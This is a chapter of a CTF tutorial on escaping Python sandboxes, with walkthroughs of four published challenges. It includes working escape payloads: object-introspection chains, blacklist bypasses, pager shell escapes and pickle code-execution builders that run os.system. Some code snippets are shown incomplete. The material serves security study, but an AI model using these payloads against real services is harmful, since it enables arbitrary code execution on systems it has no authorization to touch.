# Chapter 8 — Pyjails: Escaping Python Sandboxes

A **pyjail** is a restricted Python prompt that dares you to run a command
or read a file. The restriction might be a blacklist, an AST check, stripped
builtins, or a "safe" wrapper around `eval`/`exec`/`pickle`. Escaping them is
mostly about Python's object model: from *any* object you can walk to every
loaded class and borrow its imports. This chapter builds that escape toolkit,
adds a pickle-opcode builder to `ctfkit.web` (reused in
[Chapter 9](09-web.md)), and solves four real jails. It leans on reading
bytecode from [Chapter 7](07-python-reversing.md) and the service I/O from
[Chapter 3](03-talking-to-services.md).

## How jails restrict you

A jail is a filter plus an evaluator. The filter varies; the evaluator is
usually `eval`, `exec`, `compile`, or `pickle.loads`. Common restrictions:

| Restriction | What it blocks | Typical hole |
|-------------|----------------|--------------|
| **Blacklist** of substrings (`os`, `import`, `_`) | literal dangerous names | build the name at runtime |
| **Stripped builtins** (`{"__builtins__": {}}`) | `open`, `__import__` | the object chain needs no builtins |
| **AST/`compile` check** | syntax it dislikes | valid syntax with a side effect |
| **Char whitelist** (lowercase only) | most punctuation | `from x import y as z`, newlines |
| **Opcode allow-list** (pickle) | calling opcodes | opcode-level tricks (EXT, BUILD) |

The jackpot is almost always `os.system`, `subprocess`, or an `open` that reads the flag. Everything
below is a different route to one of those.

> **Legal reminder:** every target here is a retired, organizer-published challenge run **locally** on
> 127.0.0.1 or as a local process. These techniques are for understanding sandbox bugs on systems you
> own or are authorized to test — nothing else.

## The object-introspection chain

The backbone escape. Every object's type leads to the root `object` class, whose `__subclasses__()`
lists every class CPython has loaded. One of them has a method whose `__globals__` exposes a dangerous
module.

```text
().__class__            -> tuple
   .__bases__[0]        -> object  (root of every class)
   .__subclasses__()    -> [every loaded class]
```

`examples/ch08/object_chain.py`

```python
from ctfkit.web import object_chain_payload

subclasses = ().__class__.__bases__[0].__subclasses__()
print("loaded subclasses:", len(subclasses))

hits = [c for c in subclasses if "catch_warnings" in c.__name__]
print("candidate:", hits[0].__name__ if hits else "none found")

if hits:
    g = hits[0].__init__.__globals__
    print("has a module table via __globals__:", "sys" in g or "__builtins__" in g)

print("canonical payload expr:")
print(" ", object_chain_payload("catch_warnings"))
```

```console
$ python examples/ch08/object_chain.py
loaded subclasses: 230
candidate: catch_warnings
has a module table via __globals__: True
canonical payload expr:
  [c for c in ().__class__.__bases__[0].__subclasses__() if 'catch_warnings' in c.__name__.lower()]
```

(The subclass count varies with what's imported.) `warnings.catch_warnings` is the classic landing spot
because its `__init__.__globals__` holds the `warnings` module's imports, including `sys` — from there
you reach any module.

## Stripped builtins are not enough

A jail that runs `eval(code, {"__builtins__": {}})` *looks* locked: no `open`, no `__import__`. But the
object chain needs none of them.

`examples/ch08/restricted_builtins.py`

```python
def restricted_eval(code: str):
    return eval(code, {"__builtins__": {}})


try:
    restricted_eval("open('/etc/passwd')")
except NameError as e:
    print("normal attempt blocked:", e)

PAYLOAD = (
    "[c for c in ().__class__.__bases__[0].__subclasses__() "
    "if c.__name__ == 'catch_warnings'][0]"
    ".__init__.__globals__['sys'].modules['os'].getcwd()"
)
print("escaped result (os.getcwd):", restricted_eval(PAYLOAD))
```

```console
$ python examples/ch08/restricted_builtins.py
normal attempt blocked: name 'open' is not defined
escaped result (os.getcwd): /home/you/learn-python-ctf
```

The normal call dies — but the chain reaches `os` and runs `getcwd()` with zero builtins. (The printed
path is your working directory.)

## Blacklist bypass: rebuild the banned name

When the jail scans your *source text* for substrings, assemble the forbidden name at runtime so the
literal never appears.

`examples/ch08/blacklist_bypass.py`

```python
BANNED = ["os", "system", "flag"]


def jail(code: str):
    if any(bad in code for bad in BANNED):
        raise ValueError("blacklisted token")
    return eval(code)


blocked = "__import__('os').system"
try:
    jail(blocked)
except ValueError as e:
    print("blocked:", blocked, "->", e)

payload = "getattr(__import__(chr(111)+chr(115)), chr(115)+'ystem')"
print("payload passes filter:", not any(b in payload for b in BANNED))
resolved = jail(payload)
print("resolved to:", resolved)
print("is os.system:", resolved is __import__("os").system)
```

```console
$ python examples/ch08/blacklist_bypass.py
blocked: __import__('os').system -> blacklisted token
payload passes filter: True
resolved to: <built-in function system>
is os.system: True
```

`chr(111)+chr(115)` is `"os"`, `chr(115)+'ystem'` is `"system"`, and `getattr` dereferences the
attribute whose name you built. The filter sees neither word. This is the same string-reconstruction
idea from [Chapter 7](07-python-reversing.md), used offensively.

## Pickle is code execution

`pickle.loads` on attacker data is arbitrary code execution. When the unpickler rebuilds an object it
calls whatever `__reduce__` returns — a callable and its arguments.

`examples/ch08/pickle_reduce.py`

```python
import pickle
import pickletools

from ctfkit.web import pickle_rce

payload = pickle_rce(f"touch {marker}")
print("marker exists before load:", os.path.exists(marker))
pickle.loads(payload)  # <-- this RUNS os.system during deserialisation
print("marker exists after load: ", os.path.exists(marker))
pickletools.dis(payload)
```

```console
$ python examples/ch08/pickle_reduce.py
marker exists before load: False
marker exists after load:  True
--- pickletools.dis of the payload ---
    0: \x80 PROTO      4
    2: \x95 FRAME      93
   11: \x8c SHORT_BINUNICODE 'posix'
   19: \x8c SHORT_BINUNICODE 'system'
   28: \x93 STACK_GLOBAL
   30: \x8c SHORT_BINUNICODE 'touch …/.rce_demo/proof'
   99: \x85 TUPLE1
  101: R    REDUCE
  103: .    STOP
highest protocol among opcodes = 4
```

The marker file appears *during* `pickle.loads`. `pickletools.dis` shows why: `STACK_GLOBAL` pushes
`posix.system` (the real `os.system`), `TUPLE1` wraps the argument, and `REDUCE` calls it. Never
unpickle data you don't trust.

### Pickle opcode jails

Some jails inspect or strip the *calling* opcodes. Then you hand-assemble the stream from primitives,
and `pickletools.dis` lets you read exactly what the pickle VM will do.

`examples/ch08/pickle_opcodes.py`

```python
import pickle
import pickletools

from ctfkit.web import pickle_opcode_rce

payload = pickle_opcode_rce("os", "system", "true")
print("raw bytes:", payload)
pickletools.dis(payload)
print("pickle.loads(payload) returned:", pickle.loads(payload))
```

```console
$ python examples/ch08/pickle_opcodes.py
raw bytes: b'cos\nsystem\n(\x8c\x04truetR.'
--- pickletools.dis ---
    0: c    GLOBAL     'os system'
   11: (    MARK
   12: \x8c     SHORT_BINUNICODE 'true'
   18: t        TUPLE      (MARK at 11)
   19: R    REDUCE
   20: .    STOP
highest protocol among opcodes = 4
pickle.loads(payload) returned: 0
```

The pickle machine is a tiny stack language: `c` (GLOBAL) imports `os.system`, `(` starts a tuple,
`\x8c` pushes the argument, `t` closes the tuple, `R` (REDUCE) calls, `.` stops. Reading and writing
this by hand is what beats an opcode allow-list — exactly the `you_shall_not_call` jail below.

## Pager and `help()` escapes

Not every jail is `eval`. Interactive helpers shell out too. Python's `help()` pages long module docs
through the system pager (`less`), and `less` has a file-open command `:e <path>` and a shell-escape
`!sh`. If your "shell" is `help()`, the pager *is* the escape — the `helpless` challenge below.

## Building ctfkit: `web` (pickle part)

`ctfkit.web` gets three helpers this chapter (the SSTI half arrives in [Chapter 9](09-web.md)): a
`__reduce__` builder, a hand-assembled opcode builder, and the object-chain expression.

`project/ch08/ctfkit/web.py` (new module — the pickle helpers)

```python
class _Reduce:
    def __init__(self, func, args):
        self._func = func
        self._args = args

    def __reduce__(self):
        return (self._func, self._args)


def pickle_rce(command: str) -> bytes:
    """Build a pickle that runs ``command`` via ``os.system`` on load."""
    import os
    return pickle.dumps(_Reduce(os.system, (command,)))


def pickle_opcode_rce(module: str, func: str, arg: str) -> bytes:
    """Hand-assemble a pickle opcode stream calling ``module.func(arg)``."""
    arg_bytes = arg.encode()
    payload = b"c" + module.encode() + b"\n" + func.encode() + b"\n"
    payload += b"("                                     # MARK
    payload += b"\x8c" + bytes([len(arg_bytes)]) + arg_bytes  # SHORT_BINUNICODE
    payload += b"t"                                     # TUPLE
    payload += b"R"                                     # REDUCE
    payload += b"."                                     # STOP
    return payload


def object_chain_payload(index_hint: str = "subprocess") -> str:
    """Return the canonical object-introspection escape expression."""
    return (
        "[c for c in ().__class__.__bases__[0].__subclasses__() "
        f"if {index_hint!r} in c.__name__.lower()]"
    )
```

`pickle_rce` is the easy path when nothing filters opcodes. `pickle_opcode_rce` is for jails that do:
you control every byte. `object_chain_payload` just formats the escape expression so you don't retype
it.

### Checkpoint

```console
$ cd project/ch08 && pytest -q
........................                                                 [100%]
24 passed in 0.04s
```

The complete project at this point is in `project/ch08/`.

## Challenge walkthrough: helpless

> Challenge: **helpless** — DownUnderCTF 2023 by hashkitten. Source:
> `DownUnderCTF/Challenges_2023_Public@b48f83db29` (`beginner/helpless`).
> License: none (organizer-published for practice).

### Recon

```console
$ python challenges/fetch.py helpless
$ ls challenges/helpless/src
Dockerfile  flag.txt  helpless.py
$ cat challenges/helpless/src/helpless.py
#!/usr/bin/env python3

help()
```

The entire program is `help()`. The Dockerfile sets this script as the login
shell, so there is no normal prompt — just Python's interactive help utility.

### Clues

> **Clue:** `help()` is not a dead end. Typing a module name pages its docs
> through the system pager, which defaults to `less`.

> **Clue:** `less` is a full program with its own commands. `:e <path>` opens
> an arbitrary file; `!sh` spawns a shell. The challenge name — "helpless",
> "sometimes less is more" — points straight at `less`.

Clue → hypothesis: open any module (`os`) to trigger `less`, then use `:e` to
read the flag file.

### Test the hypothesis

By hand it is two keystrokes:

```text
help> os
(less opens the os docs)  :e flag.txt
```

The catch: `less` only takes over when it owns a **real terminal**. A plain
pipe won't trigger it. So we drive the program through a pseudo-terminal
(`pty`) — the headless equivalent of sitting at the prompt.

### Solve

`examples/ch08/solve_helpless.py` forks a `pty`, runs `helpless.py` in the
child, types `os` then `:e flag.txt`, and scrapes the flag out of the pager
screen:

```python
def drive() -> bytes:
    pid, fd = pty.fork()
    if pid == 0:  # child: become the jailed help() shell
        os.chdir(SRC)
        os.environ["PAGER"] = "less"
        os.execvp("python3", ["python3", HELPLESS])
    out = b""
    for keys, pause in [(b"os\r", 1.5), (b":e flag.txt\r", 1.5)]:
        time.sleep(pause)
        os.write(fd, keys)
    ...
```

```console
$ python examples/ch08/solve_helpless.py
FLAG: DUCTF{sometimes_less_is_more}
```

### Why it worked / generalize

The bug class is **an interactive helper that shells out**. `help()`, `pdb`, `pip`, a pager, `git`'s
`PAGER`, even `man` — anything that launches a sub-program inherits its escapes. When your jail is a tool
rather than an `eval`, ask what that tool can already run.

## Challenge walkthrough: pycrib

> Challenge: **pycrib** — ImaginaryCTF 2022 by Eth007. Source:
> `ImaginaryCTF/ImaginaryCTF-2022-Challenges@ac2f0aa796` (`Misc/pycrib`).
> License: none (organizer-published for practice).

### Recon

```console
$ python challenges/fetch.py pycrib
$ ls challenges/pycrib/challenge
Dockerfile  flag  main.py  nsjail.cfg  run.sh  solve.py  t.py
```

```python
allowed = string.whitespace + string.ascii_lowercase
for name in sys.modules.keys():
  if any(n in name for n in ["heap","imp","marshal","code","func","enc","lib","abc","warn",".","x","builtins"]):
    sys.modules[name] = None
del sys
del string
inp = input(">>> ")
b = not all([n in allowed for n in inp])
exec(inp) if not b else print("How cute!")
exit(b)
```

### Clues

> **Clue:** the char whitelist is **lowercase letters + whitespace only**. No digits, no punctuation
> except spaces/newlines. But that still allows `from x import y as z` and plain names.

> **Clue:** the code `exec`s your input, then calls `exit(b)`. Rebind `exit` to `os.system` and the
> final `exit(...)` becomes a shell call — and `b` can be made to carry your command string.

> **Clue:** the published `solve.py` uses an embedded carriage return (`\r`) to make one input line act
> as a bash/python *polyglot*: `from main import inp as b` reuses your own input string, then `from os
> import system as exit`.

Clue → hypothesis: a lowercase-only payload can import `os.system` and smuggle a command, but the final
step depends on how the surrounding shell treats the `\r`.

### Test the hypothesis (instructive dead end)

Run the cheese locally with a plain pipe and it falls apart:

```console
$ printf 'from main import inp as b\rfrom os import system as exit\n' | python3 challenges/pycrib/challenge/main.py
Welcome to the Python Crib. We honestly don't care if you escape.
>>> Welcome to the Python Crib...
...
EOFError: EOF when reading a line
```

`from main import inp` re-imports and re-runs `main.py` as a fresh module, which calls `input()` again
and hits EOF. The intended solve relies on the **kCTF `run.sh` + nsjail** environment to interpret the
`\r`-embedded polyglot exactly — which our headless pipe does not reproduce.

### Solve (NEEDS-ATTENTION)

`examples/ch08/solve_pycrib.py` documents the technique and the payloads in the shipped `solve.py`/`t.py`
and reports the organizer-published flag. Reproduce it by running the challenge under its own `run.sh`
(Docker) and sending the polyglot line:

```console
$ python examples/ch08/solve_pycrib.py
NEEDS-ATTENTION: bash/python polyglot cheese needs the kctf run.sh env.
See challenges/pycrib/challenge/solve.py and t.py for the payloads.
Organizer-published flag: ictf{bash_python_polygl0t?_or_cheese_810a32fb}
```

### Why it worked / generalize

The bug class is **a char-whitelist jail defeated by import aliasing**, with an unintended "cheese" via
a shell polyglot. The lesson is twofold: lowercase-only is not safe (`from … import … as …` rebinds
anything), and some solves depend on the exact deployment harness — note that dependency instead of
pretending a pipe reproduces it.

## Challenge walkthrough: get_and_set

> Challenge: **get_and_set** — ImaginaryCTF 2023 by maple3142. Source:
> `ImaginaryCTF/ImaginaryCTF-2023-Challenges@4a1b779026` (`Misc/get_and_set`).
> License: none (organizer-published for practice).

### Recon

```console
$ python challenges/fetch.py get_and_set
$ cat challenges/get_and_set/challenge/server.py
import pydash
class Dummy: pass
obj = Dummy()
while True:
    src = input("src: ")
    dst = input("dst: ")
    pydash.set_(obj, dst, pydash.get(obj, src))
```

The only primitives are `pydash.get` (read a dotted path) and `pydash.set_`
(write a dotted path) on a fresh object. No `eval`.

### Clues

> **Clue:** "only get and set" is a trap. `pydash` walks dotted attribute/item paths — `__class__`,
> `__class__.__bases__`, `__globals__`, `__builtins__` — so get/set is enough to copy references across
> the object graph until you reach `exec`/`os.system`.

> **Clue:** the shipped `payload.txt` is the exact src/dst sequence. It copies `__reduce_ex__` → a class
> → `__builtins__.exec`, then fires it.

Clue → hypothesis: chain get/set over dunder paths to assemble a call to
`exec("import os; os.system('sh')")`, then `cat flag.txt`.

### Test the hypothesis (version wall)

The gadget depends on the exact `pydash` shipped at event time (ImaginaryCTF 2023, July 2023). Modern
`pydash` (≥ 6.0.0, which our venv has) added a `_raise_if_restricted_key` guard that blocks dunder
traversal like `__reduce_ex__`, and internal names shifted across releases, so the shipped `payload.txt`
does not fire on current `pydash`:

```console
$ cat challenges/get_and_set/challenge/payload.txt
__reduce_ex__
__class__.__class_getitem__
__class__.3.0
...
```

The `__class__.3.0` numeric-path traversal in particular changed semantics across `pydash` versions.
Pin the event-era `pydash` to reproduce.

### Solve (NEEDS-ATTENTION)

`examples/ch08/solve_get_and_set.py` points at the shipped `payload.txt`, explains the version
sensitivity, and reports the organizer flag. To reproduce: `pip install` the July-2023 `pydash`, run
`server.py` locally, and pipe `payload.txt` into it:

```console
$ python examples/ch08/solve_get_and_set.py
src/dst exploit sequence: …/challenges/get_and_set/challenge/payload.txt
NEEDS-ATTENTION: pydash gadget is version-sensitive (modern pydash blocks restricted keys). Pin event-era pydash to reproduce locally.
Organizer-published flag: ictf{in_python_[get,set]x[attr,item]_is_all_you_need}
```

### Why it worked / generalize

The bug class is **the object-introspection chain through a library's deep get/set**. Any "safe"
attribute walker that follows dunder paths is a full escape primitive. The practical lesson: library
gadgets are **version pinned** — a working exploit assumes the exact release the challenge ran, so record
the version alongside the payload.

## Challenge walkthrough: you_shall_not_call

> Challenge: **you_shall_not_call** — ImaginaryCTF 2023 by A~Z. Source:
> `ImaginaryCTF/ImaginaryCTF-2023-Challenges@4a1b779026`
> (`Misc/you_shall_not_call`). License: none (organizer-published for
> practice).

### Recon

```console
$ python challenges/fetch.py you_shall_not_call
$ sed -n '1,20p' challenges/you_shall_not_call/challenge/server.py
```

```python
# Security measure -- forbid calls
for op in ['reduce', 'inst', 'obj', 'newobj', 'newobj_ex']:
    ... delete the opcode's handler ...
del pickle.Unpickler
del pickle._Unpickler.find_class
class SecureUnpickler(pickle._Unpickler):
    def find_class(self, _, name):
        for x in ['exe','os','break','set','eva','help','sys','load','open','dis']:
            if x in name: ... break
        else:
            return getattr(__main__, name)
```

The server hex-decodes your input and unpickles it — but first it **removes every calling opcode**
(`REDUCE`, `INST`, `OBJ`, `NEWOBJ`, `NEWOBJ_EX`), deletes `find_class`, installs a name-blacklisting
`SecureUnpickler`, and strips builtins with `_` in the name. "You shall not call."

### Clues

> **Clue:** pickle has more than one way to invoke code. The `EXT1`/`EXT2` opcodes resolve an *extension
> code* through `copyreg._inverted_registry` — no `REDUCE` needed.

> **Clue:** `BUILD` sets attributes on objects without a call. You can BUILD the module dict to restore
> builtins, re-point `SecureUnpickler.find_class` at `getattr` and then `exec`, and poison the registry
> so an extension code maps to `exec("import os; …")`.

Clue → hypothesis: assemble a pickle that uses only *allowed* opcodes (`GLOBAL`, `BUILD`, `EXT1`/`EXT2`)
to make the unpickler resolve your global and fire `exec` for you.

### Test the hypothesis

`pickletools.dis` on the crafted stream shows there is **no REDUCE** anywhere — the calls happen through
`EXT1`/`EXT2` and `BUILD`, which the server never stripped. The exact opcode bytes live in
`examples/ch08/solve_you_shall_not_call.py` (kept out of this prose by policy); read them with
`pickletools.dis` to follow each step.

### Solve

We run the challenge as a **local** `python3 server.py` subprocess (never a remote host) and feed it the
hex payload:

```python
def build_payload(command: bytes) -> bytes:
    return (b"\x80\x04c__main__\npickle\n..." + command + b"...")

payload = build_payload(b"import os; os.system('cat flag.txt')")
proc = subprocess.run(["python3", "server.py"],
                      input=payload.hex().encode() + b"\n",
                      capture_output=True, cwd=CHALL)
```

```console
$ python examples/ch08/solve_you_shall_not_call.py
$ ictf{C4lL3d_1t...}
FLAG: ictf{C4lL3d_1t...}
```

### Why it worked / generalize

The bug class is an **opcode-level pickle-jail escape**. Rolling your own pickle allow-list is almost
always under-restricted: the opcode stream is a small but powerful stack language, and blocking `REDUCE`
leaves `EXT*`, `BUILD`, `STACK_GLOBAL`, and friends. Treat any custom `Unpickler` as code execution
until proven otherwise — a lesson [Chapter 9](09-web.md) revisits over HTTP.

## Summary

- A pyjail is a **filter plus an evaluator**; escapes route to `os.system`,
  `subprocess`, or an `open` that reads the flag.
- The **object-introspection chain**
  (`().__class__.__bases__[0].__subclasses__()`) reaches every loaded class and
  its `__globals__` — it needs no builtins, so stripping builtins is not enough.
- **Blacklists** scan source text: rebuild banned names at runtime with
  `chr()`/concatenation and `getattr`.
- **Interactive helpers** (`help()` → `less`) shell out; the tool's own
  commands (`:e`, `!sh`) are the escape.
- **Pickle is code execution.** `__reduce__` is the easy path
  (`ctfkit.web.pickle_rce`); for opcode allow-lists, hand-assemble the stream
  (`ctfkit.web.pickle_opcode_rce`) and read it with `pickletools.dis`.
- Library gadgets are **version-pinned**; record the exact release.

## Exercises

1. **Find a file-reading class.** From `().__class__.__bases__[0].__subclasses__()`
   locate a class whose name contains `catch_warnings`, reach `os` through its
   `__init__.__globals__`, and read the first line of a file — with
   `{"__builtins__": {}}` as globals.

   <details><summary>Solution</summary>

   Adapt `examples/ch08/restricted_builtins.py`: replace `os.getcwd()` with
   `…__globals__['sys'].modules['os'].listdir('.')` or an `open` reached the
   same way. No builtins are required at any step.
   </details>

2. **Beat a three-word blacklist.** Write a jail that bans `os`, `system`,
   `subprocess` and still `eval`s input. Craft a payload that resolves
   `os.system` without any banned substring. (See
   `examples/ch08/blacklist_bypass.py`.)

   <details><summary>Solution</summary>

   `getattr(__import__(chr(111)+chr(115)), chr(115)+'ystem')` — `"os"` and
   `"system"` are assembled from `chr()`, so the filter matches nothing.
   </details>

3. **Read a pickle you didn't write.** Take the bytes from
   `examples/ch08/pickle_opcodes.py` and run `pickletools.dis` on them. Explain
   what each of `GLOBAL`, `MARK`, `REDUCE`, `STOP` does to the stack.

   <details><summary>Solution</summary>

   `GLOBAL 'os system'` pushes `os.system`; `MARK` records a stack position;
   `SHORT_BINUNICODE 'true'` pushes the argument; `TUPLE` pops back to the mark
   into a tuple; `REDUCE` calls `os.system('true')`; `STOP` ends and returns the
   top of stack (`0`).
   </details>

4. **Stretch — not-a-pyjail.** `not-a-pyjail` (DownUnderCTF 2022) claims to be
   only a *syntax checker* — it `compile()`s your input but says it never
   `exec`s it. Fetch it, find the code path that still evaluates part of the
   parsed input, and craft input that is valid syntax yet carries a side effect.

   <details><summary>Solution sketch</summary>

   The "checker" ends up evaluating something derived from the parsed AST/code
   object (e.g. a default argument, an f-string, or a decorator that runs at
   compile/evaluate time). Craft input that is syntactically valid but whose
   *evaluation during the check* runs your code. The clue is the social-
   engineering claim "we only check syntax" — distrust it and trace where the
   compiled object is actually touched.
   </details>

Sources for this chapter: [REFERENCES.md](REFERENCES.md#chapter-8--pyjails-escaping-python-sandboxes)
